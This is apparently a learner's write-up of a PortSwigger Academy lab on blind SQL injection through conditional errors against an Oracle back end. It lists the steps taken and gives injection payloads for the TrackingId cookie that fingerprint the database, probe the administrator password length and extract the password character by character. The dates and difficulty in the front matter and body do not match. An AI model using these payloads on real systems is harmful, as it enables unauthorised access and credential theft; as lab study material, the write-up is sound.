---
vulnerability: SQLi
platform: PortSwigger
difficulty: Medium
date: 2025-11-08
---
# Lab: Blind SQL Injection with Conditional Errors

**Date:** 2024-11-08  
**Platform:** PortSwigger Academy  
**Difficulty:** Practitioner  
**Vulnerability:** Blind SQL Injection (Conditional Errors)

## Key Steps
1. Identified blind SQL injection in the `TrackingId` cookie where errors trigger visible responses
2. Determined Oracle database usage by testing `FROM dual` requirement
3. Used `CASE` statements with deliberate divide-by-zero errors to create conditional responses
4. Verified `users` table and `administrator` account existence
5. Determined password length (20 characters) by testing `LENGTH(password)>N` conditions
6. Extracted password character by character using `SUBSTR()` with Burp Intruder

## Key Payloads
**Database Fingerprinting:**
```
TrackingId=xyz'||(SELECT '' FROM dual)||'
Conditional Error Testing:

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Password Length Detection:

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>19 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Character Extraction:

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

## Lesson Learned
When traditional blind SQLi techniques fail (no boolean-based differences), conditional errors can be exploited by deliberately triggering database errors only when specific conditions are true. Oracle's TO_CHAR(1/0) causes a divide-by-zero error that serves as a reliable "true" indicator, while proper use of CASE statements and FROM dual is essential for Oracle databases.